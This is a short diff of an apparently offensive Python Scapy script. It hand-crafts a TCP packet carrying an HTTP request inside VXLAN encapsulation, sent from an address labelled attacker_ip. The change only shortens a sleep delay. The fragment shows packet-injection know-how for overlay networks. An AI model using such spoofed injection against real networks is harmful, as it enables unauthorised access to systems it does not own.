@@ -128,7 +128,7 @@ time.sleep(1)
 # send HTTP Request
 send(VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=syn_ack_dport,seq=syn_ack_ack, ack=syn_ack_seq + 1, flags='P''A') / getStr)
 
-time.sleep(6)
+time.sleep(2)
 
 #http_layer = http_answer.getlayer(http.HTTPResponse)
 #ip_layer = http_answer.getlayer(IP)
